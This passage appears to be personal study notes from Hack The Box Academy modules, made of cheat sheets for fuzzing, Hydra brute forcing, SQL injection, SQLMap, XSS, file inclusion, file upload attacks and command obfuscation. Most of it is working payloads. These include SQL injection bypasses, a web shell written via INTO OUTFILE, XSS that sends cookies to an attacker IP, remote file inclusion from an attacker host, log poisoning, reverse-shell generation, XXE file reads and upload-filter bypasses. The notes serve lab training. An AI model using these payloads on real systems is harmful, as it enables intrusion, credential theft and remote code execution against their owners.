| `ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`       | Value Fuzzing            |

**Wordlists**

| Command                                                                   | Description             |
| ------------------------------------------------------------------------- | ----------------------- |
| `/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt` | Directory/Page Wordlist |
| `/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt`           | Extensions Wordlist     |
| `/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`      | Domain Wordlist         |
| `/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt`     | Parameters Wordlist     |

**Misc**

| Command                                                                                                                       | Description              |
| ----------------------------------------------------------------------------------------------------------------------------- | ------------------------ |
| `sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'`                                                                     | Add DNS entry            |
| `for i in $(seq 1 1000); do echo $i >> ids.txt; done`                                                                         | Create Sequence Wordlist |
| `curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'` | curl w/ POST             |

### Complete

[Completion Link](https://academy.hackthebox.com/achievement/713396/54)

## Login Brute Forcing

[Username Anarchy](https://github.com/urbanadventurer/username-anarchy) is a great tool for permutations of possible usernames for a person.

### Cheatsheet

**Hydra**

| Command                                                                                                                                | Description                                         |
| -------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------- |
| `hydra -h`                                                                                                                             | Hydra help                                          |
| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /`                                                                                   | Basic Auth Brute Force - Combined Wordlist          |
| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /`                                                             | Basic Auth Brute Force - User/Pass Wordlists        |
| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Login Form Brute Force - Static User, Pass Wordlist |
| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4`                                                                     | SSH Brute Force - User/Pass Wordlists               |
| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1`                                                                                   | FTP Brute Force - Static User, Pass Wordlist        |

**Wordlists**

| Command                                                                            | Description                |
| ---------------------------------------------------------------------------------- | -------------------------- |
| `/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | Default Passwords Wordlist |
| `/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt`                      | Common Passwords Wordlist  |
| `/opt/useful/SecLists/Usernames/Names/names.txt`                                   | Common Names Wordlist      |

**Misc**

| Command                                       | Description                            |
| --------------------------------------------- | -------------------------------------- |
| `cupp -i`                                     | Creating Custom Password Wordlist      |
| `sed -ri '/^.{,7}$/d' william.txt`            | Remove Passwords Shorter Than 8        |
| `sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt` | Remove Passwords With No Special Chars |
| `sed -ri '/[0-9]+/!d' william.txt`            | Remove Passwords With No Numbers       |
| `./username-anarchy Bill Gates > bill.txt`    | Generate Usernames List                |
| `ssh b.gates@SERVER_IP -p PORT`               | SSH to Server                          |
| `ftp 127.0.0.1`                               | FTP to Server                          |
| `su - user`                                   | Switch to User                         |

### Complete

[Completion Link](https://academy.hackthebox.com/achievement/713396/57)

## SQL Injection Fundamentals

### Databases

- **Relational databases** use structured schemas with tables, rows, and columns, and are ideal for storing well-defined data that can be easily queried using SQL. Data in these tables is interconnected through keys, allowing efficient data management. Examples include MySQL and PostgreSQL.
- **Non-relational databases** (NoSQL) don't rely on fixed schemas or structured tables, instead using flexible storage models like key-value pairs, documents, wide-columns, or graphs. They are best suited for unstructured or dynamic datasets and are highly scalable. A common example is MongoDB.

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with FILE privilege enabled
2. MySQL global _secure_file_priv_ variable not enabled (`SHOW VARIABLES LIKE 'secure_file_priv';` or `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`)
3. Write access to the location we want to write to on the back-end server

### Cheatsheet

**MySQL**

**General**

| Command                                            | Description              |
| -------------------------------------------------- | ------------------------ |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | Login to MySQL database  |
| `SHOW DATABASES`                                   | List available databases |
| `USE users`                                        | Switch to database       |

**Tables**

| Command                                                           | Description                               |
| ----------------------------------------------------------------- | ----------------------------------------- |
| `CREATE TABLE logins (id INT, ...)`                               | Add a new table                           |
| `SHOW TABLES`                                                     | List available tables in current database |
| `DESCRIBE logins`                                                 | Show table properties and columns         |
| `INSERT INTO table_name VALUES (value_1, ..)`                     | Add values to table                       |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>`  | Update table values                       |

**Columns**

| Command                                                   | Description                      |
| --------------------------------------------------------- | -------------------------------- |
| `SELECT * FROM table_name`                                | Show all columns in a table      |
| `SELECT column1, column2 FROM table_name`                 | Show specific columns in a table |
| `DROP TABLE logins`                                       | Delete a table                   |
| `ALTER TABLE logins ADD newColumn INT`                    | Add new column                   |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column                    |
| `ALTER TABLE logins MODIFY oldColumn DATE`                | Change column datatype           |
| `ALTER TABLE logins DROP oldColumn`                       | Delete column                    |

**Output**

| Command                                               | Description                                              |
| ----------------------------------------------------- | -------------------------------------------------------- |
| `SELECT * FROM logins ORDER BY column_1`              | Sort by column                                           |
| `SELECT * FROM logins ORDER BY column_1 DESC`         | Sort by column in descending order                       |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two columns                                      |
| `SELECT * FROM logins LIMIT 2`                        | Only show first two results                              |
| `SELECT * FROM logins LIMIT 1, 2`                     | Only show two results starting from index 2              |
| `SELECT * FROM table_name WHERE <condition>`          | List results that meet a condition                       |
| `SELECT * FROM logins WHERE username LIKE 'admin%'`   | List results where the name is similar to a given string |

**MySQL Operator Precedence**

- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and Subtraction (`-`)
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)

**SQL Injection**

**Auth Bypass**

| Payload            | Description                     |
| ------------------ | ------------------------------- |
| `admin' or '1'='1` | Basic Auth Bypass               |
| `admin')-- -`      | Basic Auth Bypass with comments |

**Union Injection**

| Payload                                             | Description                                    |
| --------------------------------------------------- | ---------------------------------------------- |
| `' order by 1-- -`                                  | Detect number of columns using ORDER BY        |
| `cn' UNION select 1,2,3-- -`                        | Detect number of columns using UNION injection |
| `cn' UNION select 1,@@version,3,4-- -`              | Basic UNION injection                          |
| `UNION select username, 2, 3, 4 from passwords-- -` | UNION injection for 4 columns                  |

**DB Enumeration**

| Payload                                                                                                                     | Description                                |
| --------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------ |
| `SELECT @@version`                                                                                                          | Fingerprint MySQL with query output        |
| `SELECT SLEEP(5)`                                                                                                           | Fingerprint MySQL with no output           |
| `cn' UNION select 1,database(),2,3-- -`                                                                                     | Current database name                      |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`                                                   | List all databases                         |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`                  | List all tables in a specific database     |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table       |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -`                                                        | Dump data from a table in another database |

**Privileges**

| Payload                                                                                                                                    | Description                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------- |
| `cn' UNION SELECT 1, user(), 3, 4-- -`                                                                                                     | Find current user                                    |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`                                                               | Find if user has admin privileges                    |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Find all user privileges                             |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |

**File Injection**

| Payload                                                                                                   | Description                                   |
| --------------------------------------------------------------------------------------------------------- | --------------------------------------------- |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                  | Read local file                               |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`                              | Write a string to a local file                |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/33)

## SQLMap Essentials

### Overview

The technique characters BEUSTQ refers to the following:

- B: Boolean-based blind (`AND 1=1`)
- E: Error-based (`AND GTID_SUBSET(@@version,0)`)
- U: Union query-based (`UNION ALL SELECT 1,@@version,3`)
- S: Stacked queries (`; DROP TABLE users`)
- T: Time-based blind (`AND 1=IF(2>1,SLEEP(5),0)`)
- Q: Inline queries (`SELECT (SELECT @@version) from`)

**Level/Risk**
By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.

For such demands, the options `--level` and `--risk` should be used:

- The option `--level` (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
- The option `--risk` (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

### Tamper Scripts

Finally, one of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called "tamper" scripts. Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.

For example, one of the most popular tamper scripts [between](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py) is replacing all occurrences of greater than operator (`>`) with `NOT BETWEEN 0 AND #`, and the equals operator (`=`) with `BETWEEN # AND #`. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.

Tamper scripts can be chained, one after another, within the `--tamper` option (e.g. `--tamper=between,randomcase`), where they are run based on their predefined priority. A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g. [ifnull2ifisnull](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/ifnull2ifisnull.py)). In contrast, some tamper scripts do not care about the inner content (e.g. [appendnullbyte](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/appendnullbyte.py)).

Tamper scripts can modify any part of the request, although the majority change the payload content. The most notable tamper scripts are the following:

| Tamper-Script               | Description                                                                                                                  |
| --------------------------- | ---------------------------------------------------------------------------------------------------------------------------- | --- | --- |
| `0eunion`                   | Replaces instances of UNION with e0UNION                                                                                     |
| `base64encode`              | Base64-encodes all characters in a given payload                                                                             |
| `between`                   | Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #                     |
| `commalesslimit`            | Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart                                                 |
| `equaltolike`               | Replaces all occurrences of operator equal (=) with LIKE counterpart                                                         |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword                                                                           |
| `modsecurityversioned`      | Embraces complete query with (MySQL) versioned comment                                                                       |
| `modsecurityzeroversioned`  | Embraces complete query with (MySQL) zero-versioned comment                                                                  |
| `percentage`                | Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                          |
| `plus2concat`               | Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart                                                        |
| `randomcase`                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                               |
| `space2comment`             | Replaces space character ( ) with comments `/`                                                                               |
| `space2dash`                | Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\n)                        |
| `space2hash`                | Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n) |
| `space2mssqlblank`          | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters     |
| `space2plus`                | Replaces space character ( ) with plus (+)                                                                                   |
| `space2randomblank`         | Replaces space character ( ) with a random blank character from a valid set of alternate characters                          |
| `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (&& and                                               |     | )   |
| `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                            |
| `versionedmorekeywords`     | Encloses each keyword with (MySQL) versioned comment                                                                         |

### Cheatsheet

| Command                                                                                                                   | Description                                                 |
| ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `sqlmap -h`                                                                                                               | View the basic help menu                                    |
| `sqlmap -hh`                                                                                                              | View the advanced help menu                                 |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`                                                                | Run SQLMap without asking for user input                    |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`                                                               | SQLMap with POST request                                    |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`                                                              | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt`                                                                                                       | Passing an HTTP request file to SQLMap                      |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`                                                        | Specifying a cookie header                                  |
| `sqlmap -u www.target.com --data='id=1' --method PUT`                                                                     | Specifying a PUT request                                    |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`                                             | Store traffic to an output file                             |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`                                                            | Specify verbosity level                                     |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`                                                     | Specifying a prefix or suffix                               |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`                                                                          | Specifying the level and risk                               |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`                                  | Basic DB enumeration                                        |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`                                                             | Table enumeration                                           |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`                                      | Table/row enumeration                                       |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`                             | Conditional enumeration                                     |
| `sqlmap -u "http://www.example.com/?id=1" --schema`                                                                       | Database schema enumeration                                 |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`                                                               | Searching for data                                          |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`                                                            | Password enumeration and cracking                           |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                      |
| `sqlmap --list-tampers`                                                                                                   | List all tamper scripts                                     |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`                                                              | Check for DBA privileges                                    |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                                      | Reading a local file                                        |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`                 | Writing a file                                              |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                                     | Spawning an OS shell                                        |

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/58)

## Cross-Site Scripting (XSS)

### Cheatsheet

**XSS Payloads**

| Code                                                                                          | Description                   |
| --------------------------------------------------------------------------------------------- | ----------------------------- |
| `<script>alert(window.origin)</script>`                                                       | Basic XSS Payload             |
| `<plaintext>`                                                                                 | Basic XSS Payload             |
| `<script>print()</script>`                                                                    | Basic XSS Payload             |
| `<img src="" onerror=alert(window.origin)>`                                                   | HTML-based XSS Payload        |
| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color       |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image       |
| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title          |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element   |
| `<script src="http://OUR_IP/script.js"></script>`                                             | Load remote script            |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send Cookie details to us     |

**Commands**

| Command                                                             | Description                     |
| ------------------------------------------------------------------- | ------------------------------- |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run xsstrike on a URL parameter |
| `sudo nc -lvnp 80`                                                  | Start netcat listener           |
| `sudo php -S 0.0.0.0:80`                                            | Start PHP server                |

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/103)

## File Inclusion

### Cheatsheet

**Local File Inclusion (LFI)**

| Command                                                  | Description             |
| -------------------------------------------------------- | ----------------------- |
| `/index.php?language=/etc/passwd`                        | Basic LFI               |
| `/index.php?language=../../../../etc/passwd`             | LFI with path traversal |
| `/index.php?language=/../../../etc/passwd`               | LFI with name prefix    |
| `/index.php?language=./languages/../../../../etc/passwd` | LFI with approved path  |

**LFI Bypasses**

| Command                                                                                           | Description                                               |
| ------------------------------------------------------------------------------------------------- | --------------------------------------------------------- |
| `/index.php?language=....//....//....//....//etc/passwd`                                          | Bypass basic path traversal filter                        |
| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`          | Bypass filters with URL encoding                          |
| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |
| `/index.php?language=../../../../etc/passwd%00`                                                   | Bypass appended extension with null byte (obsolete)       |
| `/index.php?language=php://filter/read=convert.base64-encode/resource=config`                     | Read PHP with base64 filter                               |

**Remote Code Execution (RCE)**

**PHP Wrappers**

| Command                                                                                                                     | Description             |
| --------------------------------------------------------------------------------------------------------------------------- | ----------------------- |
| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`                    | RCE with data wrapper   |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper  |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`                                                        | RCE with expect wrapper |

**RFI**

| Command                                                                                        | Description                  |
| ---------------------------------------------------------------------------------------------- | ---------------------------- |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` | Host web shell               |
| `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`                        | Include remote PHP web shell |

**LFI + Upload**

| Command                                                                        | Description                           |
| ------------------------------------------------------------------------------ | ------------------------------------- |
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`                        | Create malicious image                |
| `/index.php?language=./profile_images/shell.gif&cmd=id`                        | RCE with malicious uploaded image     |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | Create malicious zip archive 'as jpg' |
| `/index.php?language=zip://shell.zip%23shell.php&cmd=id`                       | RCE with malicious uploaded zip       |
| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`            | Create malicious phar 'as jpg'        |
| `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`     | RCE with malicious uploaded phar      |

**Log Poisoning**

| Command                                                                             | Description                       |
| ----------------------------------------------------------------------------------- | --------------------------------- |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`         | Read PHP session parameters       |
| `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`       | Poison PHP session with web shell |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`  | RCE through poisoned PHP session  |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'` | Poison server log                 |
| `/index.php?language=/var/log/apache2/access.log&cmd=id`                            | RCE through poisoned PHP session  |

**Misc**

| Command                                                                                                                                                                              | Description                |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------- |
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287`                                      | Fuzz page parameters       |
| `ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287`                                                      | Fuzz LFI payloads          |
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path          |
| `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287`                                                                      | Fuzz server configurations |
| [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)                                                                                                  |                            |
| [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)                                                                                |                            |
| [Webroot path wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)                                 |                            |
| [Webroot path wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)                             |                            |
| [Server configurations wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)                                                    |                            |
| [Server configurations wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)                                                |                            |

**File Inclusion Functions**

| Function                   | Read Content | Execute | Remote URL |
| -------------------------- | ------------ | ------- | ---------- |
| **PHP**                    |              |         |            |
| `include()/include_once()` | Yes          | Yes     | Yes        |
| `require()/require_once()` | Yes          | Yes     | No         |
| `file_get_contents()`      | Yes          | No      | Yes        |
| `fopen()/file()`           | Yes          | No      | No         |
| **NodeJS**                 |              |         |            |
| `fs.readFile()`            | Yes          | No      | No         |
| `fs.sendFile()`            | Yes          | No      | No         |
| `res.render()`             | Yes          | Yes     | No         |
| **Java**                   |              |         |            |
| `include`                  | Yes          | No      | No         |
| `import`                   | Yes          | Yes     | Yes        |
| **.NET**                   |              |         |            |
| `@Html.Partial()`          | Yes          | No      | No         |
| `@Html.RemotePartial()`    | Yes          | No      | Yes        |
| `Response.WriteFile()`     | Yes          | No      | No         |
| `include`                  | Yes          | Yes     | Yes        |

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/23)

## File Upload Attacks

### XSS

The most basic example is when a web application allows us to upload `HTML` files. Although HTML files won't allow us to execute code (e.g., PHP), it would still be possible to implement JavaScript code within them to carry an XSS or CSRF attack on whoever visits the uploaded HTML page. If the target sees a link from a website they trust, and the website is vulnerable to uploading HTML documents, it may be possible to trick them into visiting the link and carry the attack on their machines.

Another example of XSS attacks is web applications that display an image's metadata after its upload. For such web applications, we can include an XSS payload in one of the Metadata parameters that accept raw text, like the `Comment` or `Artist` parameters, as follows:

```sh
woadey@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
woadey@htb[/htb]$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

XSS attacks can also be carried with `SVG` images, along with several other attacks. `Scalable Vector Graphics (SVG)` images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to HTB.svg:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

### XXE

Similar attacks can be carried to lead to XXE exploitation. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server. The following example can be used for an SVG image that leaks the content of (`/etc/passwd`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Once the above SVG image is uploaded and viewed, the XML document would get processed, and we should get the info of (`/etc/passwd`) printed on the page or shown in the page source. Similarly, if the web application allows the upload of `XML` documents, then the same payload can carry the same attack when the XML data is displayed on the web application.

While reading systems files like `/etc/passwd` can be very useful for server enumeration, it can have an even more significant benefit for web penetration testing, as it allows us to read the web application's source files. Access to the source code will enable us to find more vulnerabilities to exploit within the web application through Whitebox Penetration Testing. For File Upload exploitation, it may allow us to `locate the upload directory, identify allowed extensions, or find the file naming scheme`, which may become handy for further exploitation.

To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Once the SVG image is displayed, we should get the base64 encoded content of `index.php`, which we can decode to read the source code.

### Cheatsheet

**Web Shells**

| Web Shell                                                                                | Description                           |
| ---------------------------------------------------------------------------------------- | ------------------------------------- |
| `<?php file_get_contents('/etc/passwd'); ?>`                                             | Basic PHP File Read                   |
| `<?php system('hostname'); ?>`                                                           | Basic PHP Command Execution           |
| `<?php system($_REQUEST['cmd']); ?>`                                                     | Basic PHP Web Shell                   |
| `<% eval request('cmd') %>`                                                              | Basic ASP Web Shell                   |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`           | Generate PHP reverse shell            |
| [phpbash](https://github.com/Arrexel/phpbash)                                            | PHP Web Shell                         |
| [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)                  | PHP Reverse Shell                     |
| [SecLists Web Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |

**Bypasses**

| Command                                                                                                                                    | Description                                  |
| ------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------- |
| **Client-Side Bypass**                                                                                                                     |                                              |
| `[CTRL+SHIFT+C]`                                                                                                                           | Toggle Page Inspector                        |
| **Blacklist Bypass**                                                                                                                       |                                              |
| `shell.phtml`                                                                                                                              | Uncommon Extension                           |
| `shell.pHp`                                                                                                                                | Case Manipulation                            |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions                       |
| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)                | List of ASP Extensions                       |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)                          | List of Web Extensions                       |
| **Whitelist Bypass**                                                                                                                       |                                              |
| `shell.jpg.php`                                                                                                                            | Double Extension                             |
| `shell.php.jpg`                                                                                                                            | Reverse Double Extension                     |
| `%20, %0a, %00, %0d0a, /, .\, ., …`                                                                                                        | Character Injection - Before/After Extension |

**Content/Type Bypass**

| Command                                                                                                                     | Description                         |
| --------------------------------------------------------------------------------------------------------------------------- | ----------------------------------- |
| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)              | List of Web Content-Types           |
| [All Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | List of All Content-Types           |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)                                                    | List of File Signatures/Magic Bytes |

**Limited Uploads**

| Potential Attack | File Types              |
| ---------------- | ----------------------- |
| XSS              | HTML, JS, SVG, GIF      |
| XXE/SSRF         | XML, SVG, PDF, PPT, DOC |
| DoS              | ZIP, JPG, PNG           |

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/136)

## Command Injections

### [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)

**Install**

```sh
woadey@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
woadey@htb[/htb]$ cd Bashfuscator
woadey@htb[/htb]$ pip3 install setuptools==65
woadey@htb[/htb]$ python3 setup.py install --user
```

**Example**

```sh
woadey@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```

### [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)

**Install**

```powershell
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help

